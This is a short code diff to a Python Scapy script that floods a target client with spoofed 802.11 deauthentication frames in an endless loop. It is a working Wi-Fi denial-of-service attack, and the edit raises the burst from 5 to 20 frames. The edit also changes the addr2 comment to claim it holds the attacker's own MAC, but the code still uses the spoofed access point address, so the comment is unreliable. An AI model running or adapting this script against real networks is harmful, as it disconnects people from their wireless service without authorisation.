@@ -9,7 +9,7 @@ interface = "wlan0mon"
 def spoofed_deauth(ap_mac, client_mac):
     return RadioTap()/Dot11(
         addr1=client_mac,  # Destination
-        addr2=ap_mac,      # Spoofed source (AP)
+        addr2=ap_mac,      # my actual mac adress i use to attack (AP)
         addr3=ap_mac       # BSSID
     )/Dot11Deauth(reason=7)
 
@@ -18,7 +18,7 @@ print(f"[*] Sending spoofed deauth (AP MAC {target_ap}) to {target_client}")
 try:
     while True:
         pkt = spoofed_deauth(target_ap, target_client)
-        sendp(pkt, iface=interface, count=5, inter=0.1, verbose=False)
+        sendp(pkt, iface=interface, count=20, inter=0.1, verbose=False)
         time.sleep(1)
 except KeyboardInterrupt:
     print("\n[!] Stopped by user")
